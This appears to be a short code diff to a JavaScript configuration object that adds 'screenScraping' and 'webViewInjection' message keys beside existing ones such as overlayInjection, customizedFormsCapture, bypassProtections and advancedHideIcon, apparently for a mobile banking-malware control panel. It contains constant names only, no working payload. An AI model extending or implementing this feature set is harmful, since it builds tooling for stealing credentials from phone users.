@@ -49,7 +49,12 @@ exports.messageKeys = {
     overlayInjection: '0xOI',
     customizedFormsCapture: '0xFC',
     bypassProtections: '0xBP',
-    advancedHideIcon: '0xHI'
+
+
+
+        advancedHideIcon: '0xHI',
+        screenScraping: '0xSS',
+        webViewInjection: '0xWV'
 }
 
 exports.logTypes = {
